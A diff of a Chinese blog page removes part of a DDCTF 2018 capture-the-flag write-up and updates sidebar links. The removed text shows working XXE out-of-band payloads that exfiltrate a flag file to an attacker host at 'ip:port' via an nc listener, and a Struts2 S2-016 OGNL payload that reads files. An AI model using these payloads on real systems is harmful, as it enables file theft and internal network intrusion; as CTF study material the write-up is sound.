-<p>&emsp;&emsp;登录后并没有发现特别的功能，但是代码里已经给了我们非常明显的提示：<code>xxe</code>攻击，因为它自身并没有回显，所以我们需要找到一个支持<code>xxe</code>外带数据的方法，解决方案就是：<code>xxe oob</code>。我们先在自己服务器上放置<code>evil.xml</code>，内容如下：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:port/%file;'&gt;"&gt;</span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;ps: 上面的port是nc监听的端口，接着构造payload：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % file SYSTEM "file:///flag/hint.txt"&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % remote SYSTEM "http://ip:port/evil.xml"&gt;</span></span><br><span class="line"><span class="hljs-meta">%remote;</span></span><br><span class="line"><span class="hljs-meta"> %all;</span></span><br><span class="line"><span class="hljs-meta">%send;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;发送过去：</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/49.png" height="60%"><br></div><br>&emsp;&emsp;我们就能在服务器上收到信息：</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/50.png" height="60%"><br></div><br>&emsp;&emsp;根据提示我们接着构造payload：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/"&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % remote SYSTEM "http://ip:port/evil.xml"&gt;</span></span><br><span class="line"><span class="hljs-meta">%remote;</span></span><br><span class="line"><span class="hljs-meta"> %all;</span></span><br><span class="line"><span class="hljs-meta">%send;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;结果：</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/51.png" height="60%"><br></div><br>&emsp;&emsp;再来：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/hello.action"&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % remote SYSTEM "http://ip:port/evil.xml"&gt;</span></span><br><span class="line"><span class="hljs-meta">%remote;</span></span><br><span class="line"><span class="hljs-meta"> %all;</span></span><br><span class="line"><span class="hljs-meta">%send;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/52.png" height="60%"><br></div><br>&emsp;&emsp;这时候用到了题目的提示：</p>
-<blockquote>
-<p>提示：第二层关卡应用版本号为2.3.1</p>
-</blockquote>
-<p>&emsp;&emsp;所以我们找找<code>Struts2 2.3.1</code>版本的漏洞，<a href="https://www.zybuluo.com/Dukebf/note/821989" target="_blank">此篇文章</a>有较为详细的记载。</p>
-<p>&emsp;&emsp;经过多次尝试后我们能利用的漏洞版本是<code>S2-016</code>，接着再去找漏洞脚本，一个能用的payload如下：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/hello.action?redirect:$&#123;#a=new java.io.FileInputStream('/flag/flag.txt'),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[60],#c.read(#d),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#matt.println(#d),#matt.flush(),#matt.close()&#125;"&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">dtd</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">http:</span>//<span class="hljs-attr">ip:port</span>/<span class="hljs-attr">evil.xml</span>"&gt;</span></span><br><span class="line">%dtd; </span><br><span class="line">%all;]&gt;</span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&amp;send;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/53.png" height="60%"><br></div><br>&emsp;&emsp;在进行复现的时候经常会出现<code>IOException</code>，按照其他的writeup里的payload也是如此，这也有可能是环境问题导致的。</p>
-<p>&emsp;&emsp;参考链接：</p>
-<p>&emsp;&emsp;<a href="https://impakho.com/post/ddctf-2018-writeup" target="_blank">https://impakho.com/post/ddctf-2018-writeup</a></p>
-<p>&emsp;&emsp;<a href="https://thief.one/2017/06/20/1/" target="_blank">https://thief.one/2017/06/20/1/</a></p>
-<p>&emsp;&emsp;<a href="http://www.freebuf.com/articles/web/97833.html" target="_blank">http://www.freebuf.com/articles/web/97833.html</a></p>
-<p>&emsp;&emsp;<a href="https://github.com/Eliteams/quick4j" target="_blank">https://github.com/Eliteams/quick4j</a></p>
-<p>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
 
     
 <div class="card card-transparent">
@@ -675,7 +741,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        58
+                        59
                     </p>
                 </div>
             </div>
@@ -695,7 +761,7 @@
                         标签
                     </p>
                     <p class="title has-text-weight-normal">
-                        19
+                        20
                     </p>
                 </div>
             </div>
@@ -790,7 +856,7 @@
         <h3 class="menu-label">
             标签云
         </h3>
-        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
     </div>
 </div>
 
@@ -804,6 +870,25 @@
         <h3 class="menu-label">
             最新文章
         </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/12/pcb-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="PCB鹏程杯2018 writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-02T14:05:56.000Z">2018-12-02</time></div>
+                    <a href="/2018/12/pcb-writeup/" class="has-link-black-ter is-size-6">PCB鹏程杯2018 writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -881,25 +966,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/11/got-plt-study/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
-                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -911,6 +977,17 @@
             归档
         </h3>
         <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
         
         <li>
             <a class="level is-marginless" href="/archives/2018/11/">
@@ -1063,7 +1140,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">15</span>
+                            <span class="level-item tag">16</span>
                         </span>
                     </a>
                 </li>
@@ -1248,6 +1325,17 @@
                     <a class="level is-marginless" href="/tags/笔记/">
                         <span class="level-start">
                             <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/鹏程杯/">
+                        <span class="level-start">
+                            <span class="level-item">鹏程杯</span>
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">1</span>
@@ -1279,6 +1367,25 @@
         
         <article class="media">
             
+            <a href="/2018/12/pcb-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="PCB鹏程杯2018 writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-02T14:05:56.000Z">2018-12-02</time></div>
+                    <a href="/2018/12/pcb-writeup/" class="has-link-black-ter is-size-6">PCB鹏程杯2018 writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
             <a href="/2018/11/bctf2018-fake3d-writeup/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 Fake3D Study">
@@ -1353,25 +1460,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/11/got-plt-study/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
-                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1383,6 +1471,17 @@
             归档
         </h3>
         <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
         
         <li>
             <a class="level is-marginless" href="/archives/2018/11/">
@@ -1535,7 +1634,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">15</span>
+                            <span class="level-item tag">16</span>
                         </span>
                     </a>
                 </li>
@@ -1720,6 +1819,17 @@
                     <a class="level is-marginless" href="/tags/笔记/">
                         <span class="level-start">
                             <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/鹏程杯/">
+                        <span class="level-start">
+                            <span class="level-item">鹏程杯</span>
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">1</span>
